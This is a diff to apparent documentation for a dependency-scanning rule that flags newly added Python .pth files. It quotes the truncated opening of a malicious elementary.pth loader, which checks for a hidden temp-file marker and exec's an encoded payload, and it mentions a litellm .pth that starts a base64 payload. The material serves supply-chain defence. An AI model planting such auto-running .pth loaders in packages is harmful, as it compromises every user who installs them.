@@ -39,6 +39,9 @@ elementary-data 0.23.2 → 0.23.3: WARN
            - new elementary.pth (246,691 bytes, 1 executable line(s)): import os, subprocess, tempfile, base64; x = os.path.join(tempfile.gettempdir(), ".trinny-security-update"); result = "ignore" if os.path.exists(x) else exec(b…
 ```
 
+The same rule reported litellm 1.82.8 ([PYSEC-2026-2](https://osv.dev/vulnerability/PYSEC-2026-2))
+in the replay, for a new `litellm_init.pth` that starts a base64 payload.
+
 ## How to resolve it
 
 1. Read the `.pth` file named in the evidence.
